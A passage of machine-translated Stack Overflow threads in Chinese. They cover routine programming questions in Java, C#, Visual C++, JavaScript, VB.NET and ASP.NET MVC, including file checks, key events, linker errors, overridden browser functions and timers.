
```
if (file.exists()) {
   if (file.isDirectory) {
        System.out.println("Directory already exists");
   } else {
        System.out.println("File exists");
   }
} else {
   System.out.println("Could not find a file or directory matching your request");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:28:25.093

尝试使用方法...

```
file.isFile() 
```

javadoc说

*测试此抽象路径名表示的文件是否为普通文件。如果文件不是目录，并且满足其他系统相关标准，则该文件是正常的。Java 应用程序创建的任何非目录文件都保证是普通文件。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T05:31:10.187

您的逻辑检查是否仅查看它是否是文件。如果存在您在打印语句中暗示的名称的目录，它将不会返回 true。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T05:36:07.207

利用这个为您采用的示例：

```
File f = new File(filePathString);
if(f.exists()) { /* do something */ }

         (or)

import java.io.*;

public class FileChecker {

  public static void main(String args[]) {

      File f = new File("c:\\mkyong.txt");

      if(f.exists()){
          System.out.println("File existed");
      }else{
          System.out.println("File not found!");
      }

  }

} 

               (or)

import java.io.*;

public class FileOrDirectoryExists{
  public static void main(String args[]){
  File file=new File("Any file name or 
   directory whether exists or not");
  boolean exists = file.exists();
  if (!exists) {
  // It returns false if File or directory does not exist
  System.out.println("the file or directory 
  you are searching does not exist : " + exists);

  }else{
  // It returns true if File or directory exists
  System.out.println("the file or 
  directory you are searching does exist : " + exists);
  }
  }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-04T06:08:56.427

**1.**首先**获取文件**夹中的所有文件，并将其存储在一个`ArrayList`.

**例如：**

```
 File f = new File("d:\\MyFolder);

   File[] fArr = f.listFiles();

   ArrayList<File> fList = new ArrayList<File>();

   for ( File file : fArr){

         if (file.isFile()){

                fList.add(file);

           }else{

                continue;

            }

   } 
```

**2.**现在使用`getName()`方法检查**文件是否存在**....

**假设**您正在寻找一个名为`"vivek.txt"`

**例如：**

布尔 b = 假；

```
for (File i : fList){

   if ((i.getName).equals("vivek.txt")){

           b = true;
           break;

       }

   else{

               continue;
      }

   } 
```

# objective-c - 从 nm 命令中隐藏可执行符号

> ID：11806165
> 
> 赞同：0
> 
> 时间：2012-08-04T05:25:50.320
> 
> 标签：objective-c, macos, cocoa, nm

**nm**命令列出可执行文件中的所有符号。这是逆向工程和破解的好指南。我想隐藏它们。**gcc**可能有用于此目的的开关，但*我不使用 gcc*。有没有办法直接从二进制文件中隐藏它们？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T05:28:15.917

`strip`将从二进制文件中“剥离”（删除）符号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T05:28:39.163

您可以使用[剥离](http://linux.about.com/library/cmd/blcmdl1_strip.htm)命令。

但我不会费心去除符号。很可能，您的程序可能不会引起很多人的兴趣（就像大多数程序一样）。如果存在安全问题，`strace`即使在剥离的二进制文件中，最终也可以找到（例如，通过使用来理解行为）。

# c# - 如何判断何时在 TextBox 中按下回车键？

> ID：11806166
> 
> 赞同：33
> 
> 时间：2012-08-04T05:25:52.753
> 
> 标签：c#, winforms, enter

基本上，我希望能够在`ENTER`按下键时触发事件。我已经试过了：

```
private void input_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Equals("{ENTER}"))
        {
            MessageBox.Show("Pressed enter.");
        }
    } 
```

但是 MessageBox 永远不会出现。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-08-04T05:29:26.307

试一试...

```
private void input_KeyDown(object sender, KeyEventArgs e) 
{                        
    if(e.KeyData == Keys.Enter)   
    {  
        MessageBox.Show("Pressed enter.");  
    }             
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2018-05-14T12:46:58.947

要添加到@Willy David Jr 答案：您也可以使用实际的密钥代码。

```
private void input_KeyDown(object sender, KeyEventArgs e)
{
    if (e.KeyChar == 13)
    {
        MessageBox.Show("Pressed enter.");
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-06-05T12:47:28.963

你实际上可以说

```
private void input_KeyDown(object sender, KeyEventArgs e)
{
    if (e.Key == Key.Enter)
    {
        MessageBox.Show("Pressed enter.");
    }
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2018-09-12T00:57:10.100

您可以使用 Keypress 事件。如果您只是在寻找“Enter”按键，那么您可能并不关心修饰键（例如 Shift 和/或 Ctrl），这就是为什么大多数人会使用 KeyDown 而不是 Keypress。第二个好处是回答在实施**任何**其他答案后几乎总是被问到的问题：“当我使用引用的代码时，为什么按“Enter”会发出哔声？” 这是因为需要处理 Keypress 事件。通过使用 Keypress，您可以在一处解决这两个问题：

```
private void input_KeyPress(object sender, KeyPressEventArgs e)
{
    if (e.KeyChar == (char)Keys.Enter)
    {
        // Your logic here....
        e.Handled = true; //Handle the Keypress event (suppress the Beep)
    }
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2019-03-02T16:26:37.587

如果您的表单定义了 AcceptButton，您将无法使用 KeyDown 来捕获 Enter。

您应该做的是在表单级别捕获它。将此代码添加到表单：

```
protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
{
    if ((this.ActiveControl == myTextBox) && (keyData == Keys.Return))
    {
        //do something
        return true;
    }
    else
    {
        return base.ProcessCmdKey(ref msg, keyData);
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-10-05T10:09:59.213

你也可以这样做：

```
 private void input_KeyDown(object sender, KeyEventArgs e) 
  {                        
    if(e.KeyCode== Keys.Enter)   
    {  
        //Your business logic here.
    }             
  } 
```

`KeyCode`与vs的唯一区别`KeyData`是，它可以检测与此处不需要的`KeyCode`修饰符组合（例如 CTRL、Shift + A）。`KeyCode`

# visual-c++ - 链接：未解决的外部（源于多态性）

> ID：11806173
> 
> 赞同：0
> 
> 时间：2012-08-04T05:27:24.263
> 
> 标签：visual-c++, inheritance, com, polymorphism, unresolved-external

在过去的两天里，我一直在研究这个问题，并尽可能多地使用谷歌搜索来找出这个错误。不幸的是，到目前为止我发现的一切似乎都没有解决问题。我已经*三次检查*了我的包含守卫，以及我的定义虚函数（它们都有），并注释掉了我认为可能导致问题的各种代码块。唉，我试过的都没有帮助。同样的错误。

如果有人可以查看我的代码并指出我正确的方向，那将是一个巨大的帮助。

错误如下：

```
1>TriangleDemo.obj : error LNK2001: unresolved external symbol "public: virtual bool __thiscall stitch::PixelShader::CreateShader(void)" (?CreateShader@PixelShader@stitch@@UAE_NXZ)
1>FileUtility.obj : error LNK2001: unresolved external symbol "public: virtual bool __thiscall stitch::PixelShader::CreateShader(void)" (?CreateShader@PixelShader@stitch@@UAE_NXZ)
1>TriangleDemo.obj : error LNK2001: unresolved external symbol "public: virtual void __thiscall stitch::PixelShader::Recompile(void)" (?Recompile@PixelShader@stitch@@UAEXXZ)
1>FileUtility.obj : error LNK2001: unresolved external symbol "public: virtual void __thiscall stitch::PixelShader::Recompile(void)" (?Recompile@PixelShader@stitch@@UAEXXZ)
1>FileUtility.obj : error LNK2019: unresolved external symbol "public: __thiscall stitch::PixelShader::PixelShader(class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > const &,class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > const &,class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > const &,class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > const &,class std::tr1::shared_ptr<struct RenderData> const &)" (??0PixelShader@stitch@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@000ABV?$shared_ptr@URenderData@@@tr1@3@@Z) referenced in function "public: static class stitch::PixelShader __cdecl stitch::FileUtility::LoadPixelShader(class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > const &,class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > const &,class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> > const &,class std::tr1::shared_ptr<struct RenderData> const &)" (?LoadPixelShader@FileUtility@stitch@@SA?AVPixelShader@2@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@00ABV?$shared_ptr@URenderData@@@tr1@5@@Z)
1>C:\Programming\C++\GraphicsWin32\D3DTechDemo\Debug\D3DTechDemo.exe : fatal error LNK1120: 3 unresolved externals 
```

**代码 - 标题**

**//------------------------------------------------ -------------------------------------**

---*着色器.hpp* ---

```
class Shader {
    public:
        enum ShaderType { ShaderTypePixel, ShaderTypeVertex, ShaderTypeHull };
    public:
        Shader( const std::string& filename, const std::string& shaderSrc, const std::string& entrypointFuncName,
                const std::string& shaderProfile, const RenderData_sptr& renderData_ptr,
                ShaderType sType );

        virtual ~Shader( void )
        {
            mCompiledShader->Release();
            delete mCompiledShader;
            mCompiledShader = NULL;
        }

        virtual bool CreateShader( void );
        virtual void Recompile( void );

    public:
        const std::string& Filename;
        const std::string& ShaderSrc;
        const std::string& EntrypointFuncName;
        const std::string& ShaderProfile;
        const ShaderType ShdrType;

    public:
        inline D3DDataBlob*& GetCompiledShader_mutableRef( void ) 
        { return mCompiledShader; }

        inline const D3DDataBlob* const GetCompiledShader_const( void ) const  
        { return mCompiledShader; }

        inline HRESULT GetCompilerResultMessage( void ) const
        { return mCompilerResultMessage; }

        inline const bool IsCompiled( void ) const
        { return mIsCompiled; }

    protected:
        HRESULT         mCompilerResultMessage;
        D3DDataBlob*    mCompiledShader;
        RenderData_sptr mRenderData;
        bool            mIsCompiled;
    }; 
```

**//------------------------------------------------ -------------------------------------**

--*像素着色器.hpp* --

```
class PixelShader : public Shader 
    {
    public:
        PixelShader( const std::string& filename, const std::string& shaderSrc, const std::string& entrypointFuncName,
                     const std::string& shaderProfile, const RenderData_sptr& renderData_ptr );

        virtual ~PixelShader()
        {   
            mPixelShader_ptr->Release();
            delete mPixelShader_ptr;
            mPixelShader_ptr = NULL;
        }

        bool CreateShader( void );

        void Recompile( void );

    public:
        inline D3DPixelShader* GetPixelShader_ptr( void ) const
        { return mPixelShader_ptr; }

    private:
        D3DPixelShader* mPixelShader_ptr;
    }; 
```

**//------------------------------------------------ -------------------------------------**

-- *VertexShader.hpp* --

```
class VertexShader : public Shader 
    {
    public:
        VertexShader( const std::string& filename, const std::string& shaderSrc, const std::string& entrypointFuncName,
                      const std::string& shaderProfile, const RenderData_sptr& renderData_ptr );

        virtual ~VertexShader( void )
        {
            mVertexShader_ptr->Release();
            delete mVertexShader_ptr;
            mVertexShader_ptr = NULL;
        }

        virtual bool CreateShader( void );

        virtual void Recompile( void );
    public:
        inline D3DVertexShader*& GetVertexShader_refPtrMutable( void ) 
        { return mVertexShader_ptr; }

        inline const D3DVertexShader* const GetVertexShader_ptrConst( void ) const
        { return mVertexShader_ptr; }

        inline D3DVertexShader* GetVertexShader_ptr( void ) const
        { return mVertexShader_ptr; }

    private:
        D3DVertexShader* mVertexShader_ptr;
    }; 
```

**//------------------------------------------------ -------------------------------------**

**代码 - 源文件**

*着色器.cpp*

```
Shader::Shader( const std::string& filename, const std::string& shaderSrc, const std::string& entrypointFuncName,
                const std::string& shaderProfile, const RenderData_sptr& renderData_ptr,
                ShaderType sType ) :
                    Filename( filename ),
                    ShaderSrc( shaderSrc ),
                    EntrypointFuncName( entrypointFuncName ),
                    ShaderProfile( shaderProfile ),
                    mCompiledShader( NULL ),
                    mRenderData( renderData_ptr ),
                    ShdrType( sType ),
                    mIsCompiled( false )
        {   
        }

    bool Shader::CreateShader( void )
    {
        if( mIsCompiled )
            return false;

        mCompilerResultMessage = D3DX11CompileFromFileA(
            Filename.c_str(), 
            NULL, NULL,
            EntrypointFuncName.c_str(),
            ShaderProfile.c_str(),
            NULL, NULL, NULL,
            &mCompiledShader,
            NULL, NULL
        );

        return true;
    }

    void Shader::Recompile( void )
    {
        mIsCompiled = false;
        mCompiledShader->Release();
    } 
```

**//------------------------------------------------ -------------------------------------**

-- *VertexShader.cpp* --

```
VertexShader::VertexShader( const std::string& filename, const std::string& shaderSrc, const std::string& entrypointFuncName,
                                const std::string& shaderProfile, const RenderData_sptr& renderData_ptr )
                            :Shader( filename, entrypointFuncName, shaderSrc,
                                     shaderProfile, renderData_ptr, 
                                     ShaderType::ShaderTypeVertex ),
                             mVertexShader_ptr( NULL )
    {
    }

    bool VertexShader::CreateShader( void )
    {
        Shader::CreateShader();

        D3DDataBlob* errorBuffer = 0;
        D3DDataBlob* vertShaderBuffer = 0;

        const std::string errorPrefix = "Error Compiling Vertex Shader! - ";

        mRenderData->Device->CreateVertexShader(
            mCompiledShader->GetBufferPointer(),
            mCompiledShader->GetBufferSize(),
            NULL,
            &mVertexShader_ptr
        );

        HRESULT vertShaderCompileResult = 
            D3DX11CompileFromFileA( Filename.c_str(), 
                                    0, NULL,
                                    EntrypointFuncName.c_str(),
                                    ShaderProfile.c_str(),
                                    NULL, NULL,
                                    0, &vertShaderBuffer, &errorBuffer, 0 );

        if( FAILED( vertShaderCompileResult ) )
        {
            if( errorBuffer != 0 )
            {
                OutputDebugStringA( static_cast< char* >( errorBuffer->GetBufferPointer() ) );
                errorBuffer->Release();
            }

            std::cout << errorPrefix + "vertShaderCompileResult failed." << std::endl;

            return false;
        }

        if( errorBuffer != 0 )
            errorBuffer->Release();

        vertShaderCompileResult = mRenderData->Device->CreateVertexShader( 
            vertShaderBuffer->GetBufferPointer(),
            vertShaderBuffer->GetBufferSize(),
            0, &mVertexShader_ptr );

        if( FAILED( vertShaderCompileResult ) )
        {
            if( vertShaderBuffer )
                vertShaderBuffer->Release();

            std::cout << errorPrefix + "Device->CreateVertexShader( ... ) has failed" << std::endl;

            return false;
        }

        errorBuffer->Release();
        vertShaderBuffer->Release();
        delete errorBuffer;
        delete vertShaderBuffer;

        mIsCompiled = true;

        return true;
    }

    void VertexShader::Recompile( void )
    {
        Shader::Recompile();

        mVertexShader_ptr->Release();

        /*

        if( !this->CreateShader() )
        {
            //TODO throw error.
        }
        */
    } 
```

**//------------------------------------------------ -------------------------------------**

--*像素着色器.cpp* --

```
PixelShader::PixelShader( 
                              const std::string& filename, 
                              const std::string& shaderSrc, 
                              const std::string& entrypointFuncName,
                              const std::string& shaderProfile, 
                              const RenderData_sptr& renderData_ptr 
                              )
                 : Shader( filename, shaderSrc, entrypointFuncName, shaderProfile, 
                           renderData_ptr, ShaderType::ShaderTypePixel ),
                   mPixelShader_ptr( NULL )
    {
    }

    bool PixelShader::CreateShader( void ) 
    {
        Shader::CreateShader();

        ID3D11InputLayout* inputLayout;

        D3DDataBlob* errorBuffer = 0;
        D3DDataBlob* pixShaderBuffer = 0;

        const std::string errorPrefix = "Error Compiling Pixel Shader! - ";

        mRenderData->Device->CreatePixelShader(
            mCompiledShader->GetBufferPointer(),
            mCompiledShader->GetBufferSize(),
            NULL,
            &mPixelShader_ptr
        );

        HRESULT pixShaderCompileResult = 
            D3DX11CompileFromFileA( Filename.c_str(), 
                                    0, NULL,
                                    EntrypointFuncName.c_str(),
                                    ShaderProfile.c_str(),
                                    NULL, NULL,
                                    0, &pixShaderBuffer, &errorBuffer, 0 );

        if( FAILED( pixShaderCompileResult ) )
        {
            if( errorBuffer != 0 )
            {
                OutputDebugStringA( static_cast< char* >( errorBuffer->GetBufferPointer() ) );
                errorBuffer->Release();
            }

            std::cout << errorPrefix + "pixelShaderCompileResult failed." << std::endl;

            return false;
        }

        if( errorBuffer != 0 )
            errorBuffer->Release();

        pixShaderCompileResult = mRenderData->Device->CreatePixelShader( 
            pixShaderBuffer->GetBufferPointer(),
            pixShaderBuffer->GetBufferSize(),
            0, &mPixelShader_ptr );

        if( FAILED( pixShaderCompileResult ) )
        {
            if( pixShaderBuffer )
                pixShaderBuffer->Release();

            std::cout << errorPrefix + "Device->CreatePixelShader( ... ) has failed" << std::endl;

            return false;
        }

        errorBuffer->Release();
        pixShaderBuffer->Release();
        delete errorBuffer;
        delete pixShaderBuffer;

        mIsCompiled = true;

        return true;
    }

    void PixelShader::Recompile( void )
    {
        Shader::Recompile();

        mPixelShader_ptr->Release();

        /*

        if( !this->CreateShader() )
        {
            //TODO throw error.
        }
        */
    } 
```

**更新**

因为似乎`FileUtility.obj`是什么引发了错误，所以我决定发布它们以希望在这里找到一些东西..

**文件实用程序.hpp**

```
#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>
#include "Render/Shader.hpp"
#include "Render/PixelShader.hpp"
#include "Render/VertexShader.hpp" //<--these shader includes are inlcuded by .cpp as well

namespace stitch
{

    //--------------------------------------------------------------
    // NOTES:
    // - Omit file extension when specifying filename in FileUtility::LoadPixelShader/VertexShader functions - i.e., 
    //   use the identifier "TriangleVertexShader" as opposed to "TriangleVertexShader.hlsl"
    // - Omit file extension when using FileUtility::LoadTextFile.
    //--------------------------------------------------------------

    class FileUtility
    {
    public:
        //static std::string LoadTextFile( const std::string& filename );

        static VertexShader LoadVertexShader( const std::string& filename, const std::string& entrypointFuncName,
                                       const std::string& shaderProfile, const RenderData_sptr& renderData_ptr );

        static PixelShader  LoadPixelShader( const std::string& filename, const std::string& entrypointFuncName,
                                       const std::string& shaderProfile, const RenderData_sptr& renderData_ptr );

        static std::string Win32GetEnv( const char* name );
    };
} 
```

**文件实用程序.cpp**

```
//----------------------------------------------------------------------------------------------------------------------------------
    // Static Constant Members
    //----------------------------------------------------------------------------------------------------------------------------------

    static const std::string& ShaderRoot     = FileUtility::Win32GetEnv( "STITCH_SRC" ) + std::string( "\\Resources\\Shaders\\" );
    static const std::string& ProjectRootDir = FileUtility::Win32GetEnv( "STITCH_SRC" );

    //----------------------------------------------------------------------------------------------------------------------------------
    // 
    //----------------------------------------------------------------------------------------------------------------------------------

    const int MAX_CHAR_BUF = 65535; 

    static std::string _GetShaderSrc( const std::string& filename )
    {
        const std::string shaderFullpath = ShaderRoot + filename + ".fx";

        std::ifstream ifs    = std::ifstream( shaderFullpath.c_str(), std::ifstream::in );
        std::stringstream ss = std::stringstream( std::stringstream::in | std::stringstream::out );

        ss << ifs.rdbuf();

        ifs.close();

        return ss.str();
    }

    //----------------------------------------------------------------------------------------------------------------------------------

    std::string FileUtility::Win32GetEnv( const char* name )
    {
        static char buf[MAX_CHAR_BUF];

        if ( GetEnvironmentVariableA( name, buf, MAX_CHAR_BUF ) ){
            return std::string( buf );
        }
    }

    VertexShader FileUtility::LoadVertexShader( const std::string& filename, const std::string& entrypointFuncName,
                                         const std::string& shaderProfile, const RenderData_sptr& renderData_ptr )
    {
        const std::string shaderSrc = _GetShaderSrc( filename ); 

        VertexShader vs = VertexShader( filename, shaderSrc, entrypointFuncName, shaderProfile, renderData_ptr );

        return vs;
    }

    PixelShader FileUtility::LoadPixelShader( const std::string& filename, const std::string& entrypointFuncName,
                                         const std::string& shaderProfile, const RenderData_sptr& renderData_ptr )
    {
        const std::string shaderSrc = _GetShaderSrc( filename ); 

        PixelShader ps = PixelShader( filename, shaderSrc, entrypointFuncName, shaderProfile, renderData_ptr );

        return ps;
    } 
```

# javascript - 调用本机浏览器函数，即使它已被覆盖

> ID：11806178
> 
> 赞同：7
> 
> 时间：2012-08-04T05:28:34.287
> 
> 标签：javascript

如果我有类似的东西

```
alert = 0; 
```

在另一个脚本中。

这是在另一个脚本中，我的代码无法在该脚本之前加载。

如何`alert`在我的脚本中调用原始方法？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-04T05:32:44.210

在覆盖原始文件之前`alert`，保存它。

```
var origAlert = alert;
alert = 0;
origAlert("foo"); 
```

演示：http: [//jsfiddle.net/jfriend00/tnNE7/](http://jsfiddle.net/jfriend00/tnNE7/)

* * *

如果您无法保存原始值，我知道的唯一其他访问它的方法是在 iframe 中。这是一个例子：

```
alert = 0;
var iframe = document.createElement("iframe");
iframe.height = 0;
iframe.width = 0;
document.body.appendChild(iframe);
iframe.contentWindow.alert.call(window, "foo");​ 
```

工作示例：http: [//jsfiddle.net/jfriend00/waMEV/](http://jsfiddle.net/jfriend00/waMEV/)

我没有在所有浏览器中尝试过，但它适用于 Chrome、IE 和 Firefox，我认为它应该适用于其他浏览器。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-04T06:05:07.460

好的，我是第一个承认这是一个丑陋的答案，但它似乎工作：

```
alert = 0;

var win = window.open(),
    method = win.alert;
win.close();

method.call(window, "my message"); 
```

[在这里拉小提琴。](http://jsfiddle.net/TrseB/1/)本质上，您创建了一个新窗口实例并窃取了它的`alert`方法。缺点是您实际上必须打开一个新的浏览器窗口，尽管时间很短。我怀疑这实际上是解决您的问题的实用解决方案 - 取决于您尝试使用的其他站点，以及您对解决方案对最终用户的看法的关心程度。

**编辑**：这是上述答案和 jfriend00 的答案的组合，它解决了“打开一个新窗口”问题。我认为这是一个更好的选择，因为a）当您需要调用该方法时，它不依赖仍在 DOM 中的 iframe，并且 b）它应该可以推广到任何`window`方法，jfriend00 的答案可能不是吨。

```
alert = 0;

// make a new window instance in an iframe
var iframe = document.createElement("iframe");
iframe.height = iframe.width = 0;
document.body.appendChild(iframe);
// steal the method
var method = iframe.contentWindow.alert;
// remove the evidence
document.body.removeChild(iframe);

// now use the method for your own purposes
function myAlert(message) {
    method.call(window, message);
}
myAlert("foo"); 
```

# vb.net - 需要在列表框中的 MS Access 表

> ID：11806181
> 
> 赞同：0
> 
> 时间：2012-08-04T05:29:13.407
> 
> 标签：vb.net

好的，我有世界上最差的 VB 课程。该死的教科书让你做编程项目，但愚蠢的书甚至没有解释项目所需的一切。哦，是的，这门课的教授不值得废话（在线教育）。

不用说，我已经在课堂上挣扎了很长时间......

好吧，这是我的要求：

[这是所需内容的直观表示](http://www.flickr.com/photos/83812754@N07/7708566510/in/photostream)

现在，我已经与这件事斗争了很多小时，并且想要一些关于如何完成这件愚蠢的事情的提示和建议。我通常在这个网站上发帖时会更具体，除了这次，似乎我的一切都有问题！！！

以下是说明：“数据库 Microland.accdb 由 Microland Computer Warehouse 维护，该公司是一家邮购计算机供应公司。下表显示了数据库中三个表中的数据。表 Customers 通过 ID 标识每个客户编号，除了名称和地址之外，还给出了今天之前当年的采购总量。库存表通过 ID 号标识库存中的每种产品，并给出除了其描述和价格（每单位)，一天开始时的库存数量。Orders 表给出了今天收到的订单。假设现在是一天结束。编写一个 Visual Basic 程序，使用这三个表来完成以下两个任务：

1.  在列表框中显示缺货的项目和必须重新订购以满足今天的订单的项目。

2.  在列表框中显示白天订购的所有客户的账单。每张账单应显示客户的姓名、地址、订购的物品（含成本）和订单的总成本。

所以，如果你们中的任何一个 VB 天才想告诉我如何做这些事情，那绝对很棒。任何形式的帮助肯定会对我产生影响。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T11:14:45.660

（我假设它是 VB.NET）这里有一些关于大局的指针，你需要谷歌来填写详细信息：

1) 使用 ADO.NET 建立与 Access 数据库的连接。也许在代码中执行此操作或使用 Visual Studio 中的数据工具？

2) 编写一个查询（在 Access 或普通 SQL 中）以查找今天已购买的不同库存商品的数量，然后从当天开始时的库存商品数量中减去该数量。选择计数为零或更少的项目。您可以使用 Access 中的可视化构建器并保存查询对象，在代码中引用此查询对象。或者，您可以复制 Access 生成的 SQL 并将其与 ADO.NET 命令对象一起使用。

3) 在列表框中显示此查询的结果。逐步通过 DataReader 将项目添加到代码中的列表框，或者调查与数据源的数据绑定。

4) 编写另一个查询，显示问题中步骤 2 中请求的数据，然后在另一个列表框中列出这些结果。

尝试进一步了解它，然后用进展和进一步的问题做出回应。

# javascript - 手机锁定时如何运行计时器？

> ID：11806183
> 
> 赞同：0
> 
> 时间：2012-08-04T05:29:24.827
> 
> 标签：javascript, android

我需要有关 JavaScript 的帮助。我正在使用此代码来获取程序的执行时间：

```
if(seconds == sec){alert(sec);}

function countdown(element) {
    interval = setInterval(function() {
        var el = document.getElementById(element);    
        if(seconds == 0) {
          //alert(seconds);
          if(minutes == 0) {
            el.innerHTML = "00 : 00"; 
            alert("Sorry, you have exceeded our booking time and your order has been cancelled. We are afraid you have to start over!",null,'');
            clearInterval(interval);
            ajax_load_image();
            window.location.href='movies.html';
            return;
          } else {
            minutes--;
            seconds = 60;
          }
        }
        if(minutes > 0) {     
          var minute_text = minutes+(minutes > 1 ? ' ' : ' ');
        } else {
          var minute_text = '0';
        }
        if(minute_text<0)
        {
          $('#countdown').css('color','red');
        }
        var second_text =seconds > 1 ? '' : '';
        if(minute_text=='')
        {
          el.innerHTML ='0 : '+seconds;
        }
        else
        {
          if(seconds<10)
          {
            seconds='0'+seconds;
          }  
          el.innerHTML = '0'+minute_text + ' : ' + seconds + ' ' + second_text + ' Min';
        }
        seconds--;
    }, 1000);
} 
```

当我锁定手机时，计时器会自动停止。当我锁定手机时，我该怎么做才能运行计时器。帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:32:07.533

如果您关心经过的实际时间量，请不要依赖`setInterval()`- 将开始时间与当前时间进行比较。

```
var startTime = new Date();

setInterval(function() {
   // you might need to call .getTime() here - this works in Chrome,
   // but that might be implementation-dependent
   var seconds = ((new Date()) - startTime) / 1000;

   // etc
}); 
```

我不知道这将如何在移动环境中工作，但是当您解锁并`setInterval()`再次运行时，它应该会正确超时。

# javascript - Javascript猜谜游戏

> ID：11806185
> 
> 赞同：2
> 
> 时间：2012-08-04T05:29:34.100
> 
> 标签：javascript

我是 javascript 和 html 的新手，所以我希望有人可以查看我的代码并告诉我为什么某些语法不起作用。在下面的代码中，我使用 document.getElementById 来检索我每次都想使用的元素。我确实将它们声明为 gameTime() 中的局部变量，并在整个函数中使用它。

```
 var randNum = Math.floor( 100*Math.random() ) +1;
    var numGuesses = 0;

    function gameTime()
    {   
        var guess = document.getElementById("guess").value;
        var status = document.getElementById("status"); 

        numGuesses++;

        if(guess == "")
        {
            alert("You did not guess a number!")
            numGuesses--;
        }
        else if(guess == randNum)
            status.value += (guess + " was the right number! It only took you " + numGuesses + " tries" + "\r")
        else if(guess > randNum)
            status.value += (guess + " is too high!" + "\r")
        else    
            status.value += (guess + " is too low!" + "\r")

        document.getElementById("guess").value = "";
    }

    function reset()
    {
        randNum = Math.floor( 100*Math.random() ) +1;
        numGuesses = 0;
        document.getElementById("guess").value = "";
        document.getElementById("status").value = "";
    }

    function quit()
    {
        document.getElementById("status").value += ("The correct number was " + randNum + "!\r")
    } 
```

然后我通过全局声明这两个元素来尝试它，并在每个似乎根本不起作用的函数中使用它，我只是不明白为什么。

```
 var randNum = Math.floor( 100*Math.random() ) +1;
    var numGuesses = 0;
    var guess = document.getElementById("guess").value;
    var status = document.getElementById("status");

    function gameTime()
    {   
        numGuesses++;

        if(guess == "")
        {
            alert("You did not guess a number!")
            numGuesses--;
        }
        else if(guess == randNum)
            status.value += (guess + " was the right number! It only took you " + numGuesses + " tries" + "\r")
        else if(guess > randNum)
            status.value += (guess + " is too high!" + "\r")
        else    
            status.value += (guess + " is too low!" + "\r")

        guess.value = "";
    }

    function reset()
    {
        randNum = Math.floor( 100*Math.random() ) +1;
        numGuesses = 0;
        guess.value = "";
        status.value = "";
    }

    function quit()
    {
        status.value += ("The correct number was " + randNum + "!\r")
    } 
```

这是这些js文件附带的html文件guess.js是第一个代码块，guessAgain.js是第二个代码块。

```
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
    "http://www.w3.org/TR/html4/loose.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
            <title>Guessing Game</title>
            <script type="text/javascript" src="guessAgain.js"></script>
        </head>
        <body>
            <label for = "guess"> Your Guess: </label>
            <input type = "text" id = "guess" value = "" />    
            <input type = "button" onclick = "gameTime()" value = "Submit" />  
            <input type = "button" onclick = "reset()" value = "New Game" />
            <input type = "button" onclick = "quit()" value = "Quit" />
            <br>    
            <textarea id = "status" rows = "10" cols = "52"></textarea>  
        </body> 
    </html> 
```

感谢您能给我的任何见解。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T05:31:48.797

您正在将guess 设置为 element.value

它应该是

```
var guess = document.getElementById("guess"); 
```

问题是您在`guess`这里用作元素：

```
guess.value = ""; 
```

您还需要将`guess`用作字符串的位置修改为`guess.value`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T05:40:33.297

**问题 1：** 您在正文加载之前调用以下内容，因此它们返回未定义。

```
var guess = document.getElementById("guess");
var status = document.getElementById("status"); 
```

您应该仅在主体加载`onload()`事件后执行这些操作。

**问题 2：**

此外，当您将值本身分配给变量时，它不会像文本框那样更新。`var guess = document.getElementById("guess").value`，那么`guess`如果您更改文本框，则 的值不会更新。

如果您参考`var guess = document.getElementById("guess")`，那么，重复调用 `guess.value`将返回输入字段的最新值。

**[（工作示例）](http://jsfiddle.net/PZ6s6/)**

* * *

以下是没有错的不必要的**复杂**。

```
 numGuesses++;   
        if(guess.value == "")
        {
            alert("You did not guess a number!")
            numGuesses--;
        }
        ... 
```

相反，一旦它被认为是一个有效的猜测，你可以增加 numGuesses，即在最后。

# asp.net-mvc-3 - ASP.NET MVC3 视图的设计视图

> ID：11806192
> 
> 赞同：1
> 
> 时间：2012-08-04T05:32:00.537
> 
> 标签：asp.net-mvc-3

ASP.NET MVC3 中是否有设计视图？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T08:12:19.397

MVC 中没有“设计”视图，就像 Forms 中一样。但是，您的视图只是 HTML，因此您可以使用任何 HTML 编辑器，尽管它们无法解释 Razor 语法。

大多数人所做的是对 HTML 进行更改、保存（您不必重新编译）并刷新您的浏览器。谷歌浏览器内置了一个非常有用的完整工具（Firebug 或类似的工具。）只需右键单击页面并选择`Inspect Element.`这将非常方便。

